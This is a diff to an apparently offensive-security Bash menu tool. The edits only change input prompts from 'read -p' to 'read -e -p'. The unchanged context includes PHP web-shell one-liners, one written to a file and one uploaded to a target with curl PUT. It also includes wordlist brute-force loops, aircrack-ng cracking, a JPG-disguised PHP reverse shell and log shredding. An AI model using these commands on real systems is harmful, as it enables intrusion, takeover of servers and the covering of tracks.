@@ -25,7 +25,7 @@ function ScaricaIn
 	else
 		ls /storage
 		echo "Digit where download, remember the slash at the end of the path"
-		read -p "(example, /storage/emulated/legacy/Download/): " ATD
+		read -e -p "(example, /storage/emulated/legacy/Download/): " ATD
 		if [[ -d "$ATD" ]];
 		then
 			wget --no-check-certificate "$1" -O "$ATD""$2"
@@ -38,7 +38,7 @@ function Installa
 {
 	echo "This utility will try to install your chosen repo. Digit the repo folder without slash '/'"
 	ls
-	read -p "(example, myrepo): " REPO
+	read -e -p "(example, myrepo): " REPO
 	if [[ "$REPO" != "" ]];
 	then
 		if [[ -d "$REPO""/" ]];
@@ -992,7 +992,7 @@ while true; do
 							done
 							airmon-ng stop "$WFDM"
 							echo "Digit a password wordlist file"
-							read -p "(example, /usr/share/wordlists/rockyou.txt): " WRDL
+							read -e -p "(example, /usr/share/wordlists/rockyou.txt): " WRDL
 							if [[ -f "$WRDL" ]];
 							then
 								aircrack-ng capture-*.cap -w "$WRDL"
@@ -1465,11 +1465,11 @@ while true; do
 	;;
 	"76")
 		echo "Digit a binary file to analyze"
-		read -p "(example, ./file.bin): " FLB
+		read -e -p "(example, ./file.bin): " FLB
 		if [[ -f "$FLB" ]];
 		then
 			echo "Digit a file name to save the report"
-			read -p "(example, bin.report): " FLRP
+			read -e -p "(example, bin.report): " FLRP
 			if [[ "$FLRP" != "" ]];
 			then
 				r2 -c "e scr.color=false" -c "aaaa" -c "afl" -q "$FLB" > "$FLRP"
@@ -1601,7 +1601,7 @@ while true; do
 		ssh-keygen -t rsa -b 2048 -f id_rsa"$UTENTE"
 	;;
 	"104")
-		read -p "Digit a complete path of file to encode to utf16 base64: " FILEPATH
+		read -e -p "Digit a complete path of file to encode to utf16 base64: " FILEPATH
 		if [[ "$FILEPATH" != "" ]];
 		then
 			if [[ -f "$FILEPATH" ]];
@@ -1619,7 +1619,7 @@ while true; do
 		fi
 	;;
 	"105")
-		read -p "Digit a complete path of file to encode to utf8 base64: " FILEPATH
+		read -e -p "Digit a complete path of file to encode to utf8 base64: " FILEPATH
 		if [[ "$FILEPATH" != "" ]];
 		then
 			if [[ -f "$FILEPATH" ]];
@@ -1652,7 +1652,7 @@ while true; do
 		echo "<?php if (!empty($_POST['cmd'])){echo shell_exec($_POST['cmd']);} ?>" > cmd-post.php
 	;;
 	"111")
-		read -p "Digit a file to dump in escaped hex vales: " HEXD
+		read -e -p "Digit a file to dump in escaped hex vales: " HEXD
 		if [[ -f "$HEXD" ]];
 		then
 			BSF=$(hexdump -v -e '"\\\x" 1/1 "%02X"' "$HEXD")
@@ -1779,11 +1779,11 @@ while true; do
 	;;
 	"135")
 		echo "Digit a binary file to analyze"
-		read -p "(example, ./file.bin): " FLB
+		read -e -p "(example, ./file.bin): " FLB
 		if [[ -f "$FLB" ]];
 		then
 			echo "Digit a file name to save the report"
-			read -p "(example, bin.report): " FLRP
+			read -e -p "(example, bin.report): " FLRP
 			if [[ "$FLRP" != "" ]];
 			then
 				ADDS=$(r2 -c "e scr.color=false" -c "aaaa" -c "afl" -q "$FLB" | awk '{print $1}')
@@ -1899,7 +1899,7 @@ while true; do
 		Clona "s0md3v/XSStrike"
 	;;
 	"165")
-		read -p "Digit a path in which mounting remote smb share folder: " PERCO
+		read -e -p "Digit a path in which mounting remote smb share folder: " PERCO
 		if [[ "$PERCO" != "" ]];
 		then
 			if [[ ! -d "$PERCO" ]];
@@ -1912,7 +1912,7 @@ while true; do
 				read -p "Digit a remote username target, (empty field is for null session): " USERTRG
 				if [[ "$USERTRG" != "" ]];
 				then
-					read -p "Digit a remote username'password target: " PASSTRG
+					read -p "Digit a remote username's password target: " PASSTRG
 					if [[ "$PASSTRG" != "" ]];
 					then
 						mount -t cifs -o 'username="$USERTRG",password="$PASSTRG"' "$IPTS" "$PERCO"
@@ -2564,7 +2564,7 @@ while true; do
 				then
 					echo "Digit a password wordlist filepath"
 					find /usr/share/wordlists/
-					read -p "(example, /usr/share/wordlists/rockyou.txt): " WORDLIST
+					read -e -p "(example, /usr/share/wordlists/rockyou.txt): " WORDLIST
 					if [[ "$WORDLIST" != "" ]];
 					then
 						if [[ -f "$WORDLIST" ]];
@@ -2578,7 +2578,7 @@ while true; do
 							else
 								echo "Digit ad username or a wordlist username filepath"
 								find /usr/share/wordlists
-								read -p "(example, admin or /usr/share/wordlists/nmap.lst): " USR
+								read -e -p "(example, admin or /usr/share/wordlists/nmap.lst): " USR
 								if [[ "$USR" != "" ]];
 								then
 									case "$PROTO" in
@@ -2736,7 +2736,7 @@ while true; do
 		then
 			echo "Digit a wordlist fullpath"
 			find /usr/share/dirbuster/wordlists/
-			read -p "(example, /usr/share/dirbuster/wordlists/directory-​list-2.3-medium.txt)" FILENAME
+			read -e -p "(example, /usr/share/dirbuster/wordlists/directory-​list-2.3-medium.txt)" FILENAME
 			if [[ -f "$FILENAME" ]];
 			then
 				gobuster dir -w "$FILENAME" -u "$IP"
@@ -2795,7 +2795,7 @@ while true; do
 		if [[ -f "$JPG" ]];
 		then
 			echo "Digit a php revshell file fullpath to add jpg header"
-			read -p "(example, revshell.php): " REVSH
+			read -e -p "(example, revshell.php): " REVSH
 			if [[ -f "$REVSH" ]];
 			then
 				head -c 20 "$JPG" > test.txt
@@ -3073,7 +3073,7 @@ while true; do
 	;;
 	"430")
 		echo "Digit a fullpath file to wipe"
-		read -p "(example, /home/username/logfile): " TFL
+		read -e -p "(example, /home/username/logfile): " TFL
 		if [[ "$TFL" != "" ]];
 		then
 			if [[ -f "$TFL" ]];
@@ -3084,7 +3084,7 @@ while true; do
 	;;
 	"431")
 		echo "Digit a fullpath file to shred"
-		read -p "(example, /home/username/logfile): " TFL
+		read -e -p "(example, /home/username/logfile): " TFL
 		if [[ "$TFL" != "" ]];
 		then
 			if [[ -f "$TFL" ]];
@@ -3499,7 +3499,7 @@ while true; do
 	"539")
 		ls
 		echo "Digit a file to clear metadata in it"
-		read -p "(example, photo.jpg): " PHT
+		read -e -p "(example, photo.jpg): " PHT
 		if [[ -f "$PHT" ]];
 		then
 			exiftool -all= "$PHT"
@@ -3697,7 +3697,7 @@ while true; do
 		if [[ "$IP" != "" ]];
 		then
 			echo "Digit a folder shared in smb or samba from remote IP target"
-			read -p "(example, backups): " FLD
+			read -e -p "(example, backups): " FLD
 			if [[ "$FLD" != "" ]];
 			then
 				echo "Digit an username or username%password of remote IP target"
@@ -3729,7 +3729,7 @@ while true; do
 		if [[ "$URL" != "" ]];
 		then
 			echo "Digit a cool shell name without extension to avoid blocks"
-			read -p "(example, wsh3ll): " SHL
+			read -e -p "(example, wsh3ll): " SHL
 			if [[ "$SHL" != "" ]];
 			then
 				curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' "$URL""/""$SHL"".php"
@@ -3800,7 +3800,7 @@ while true; do
 		if [[ "$TRG" != "" ]];
 		then
 			echo "Digit a wordlist usernames file path"
-			read -p "(example, /usr/share/wordlist/users.txt): " USRF
+			read -e -p "(example, /usr/share/wordlist/users.txt): " USRF
 			if [[ "$USRF" != "" ]];
 			then
 				if [[ -f "$USRF" ]];
@@ -3854,7 +3854,7 @@ while true; do
 				if [[ "$DMN" != "" ]];
 				then
 					echo "Digit a wordlist password file path"
-					read -p "(example, /usr/share/wordlist/rockyou.txt): " WFL
+					read -e -p "(example, /usr/share/wordlist/rockyou.txt): " WFL
 					if [[ -f "$WFL" ]];
 					then
 						echo "Digit a LOCAL PORT for port forwarding (optional)"
@@ -3978,7 +3978,7 @@ while true; do
 	"649")
 		echo "Digit a tar.gz file full path to extract"
 		ls *.tar.gz
-		read -p "(example, ./example.tar.gz): " FLTR
+		read -e -p "(example, ./example.tar.gz): " FLTR
 		if [[ -f "$FLTR" ]];
 		then
 			tar zxvf "$FLTR"
@@ -4059,7 +4059,7 @@ while true; do
 	;;
 	"669")
 		echo "Digit an executable file name to analyze"
-		read -p "(example, ./sysinfo): " EXF
+		read -e -p "(example, ./sysinfo): " EXF
 		if [[ -f "$EXF" ]];
 		then
 			echo "Digit a report file name"
@@ -4367,11 +4367,11 @@ while true; do
 		if [[ "$IP" != "" ]];
 		then
 			echo "Digit a password wordlist file full path"
-			read -p "(example, /usr/share/wordlists/passwords.txt): " PWRD
+			read -e -p "(example, /usr/share/wordlists/passwords.txt): " PWRD
 			if [[ -f "$PWRD" ]];
 			then
 				echo "Digit a username wordlist file full path"
-				read -p "(example, /usr/share/wordlists/usernames.txt): " UWRD
+				read -e -p "(example, /usr/share/wordlists/usernames.txt): " UWRD
 				if [[ -f "$UWRD" ]];
 				then
 					for PSSW in $(cat "$PWRD");
@@ -4439,11 +4439,11 @@ while true; do
 			if [[ "$DMN" != "" ]];
 			then
 				echo "Digit USERNAME wordlist full path"
-				read -p "(example, /usr/share/wordlists/usernames.txt): " UWRD
+				read -e -p "(example, /usr/share/wordlists/usernames.txt): " UWRD
 				if [[ -f "$UWRD" ]];
 				then
 					echo "Digit PASSWORD wordlist full path"
-					read -p "(example, /usr/share/wordlists/passwords.txt): " PWRD
+					read -e -p "(example, /usr/share/wordlists/passwords.txt): " PWRD
 					if [[ -f "$PWRD" ]];
 					then
 						for PSS in $(cat "$PWRD");
@@ -8983,11 +8983,11 @@ while true; do
 	;;
 	"2261")
 		echo "Digit a file to encrypt"
-		read -p "(example, ./payload): " FL
+		read -e -p "(example, ./payload): " FL
 		if [[ -f "$FL" ]];
 		then
 			echo "Digit a new file name"
-			read -p "(example, payload.enc): " ENFL
+			read -e -p "(example, payload.enc): " ENFL
 			if [[ "$ENFL" != "" ]];
 			then
 				zip -e "$ENFL" "$FL"
